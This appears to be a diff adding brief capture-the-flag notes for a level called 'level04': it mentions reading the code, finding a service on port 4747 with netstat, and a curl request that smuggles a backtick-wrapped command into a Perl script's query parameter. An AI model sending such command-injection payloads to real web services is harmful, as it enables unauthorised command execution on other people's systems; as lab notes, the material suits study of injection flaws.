@@ -1,0 +1,3 @@
+Read the code
+netstat -ano -p tcp -> somthings going on at 4747
+curl 'localhost:4747/level04.pl?x=`getflag`'
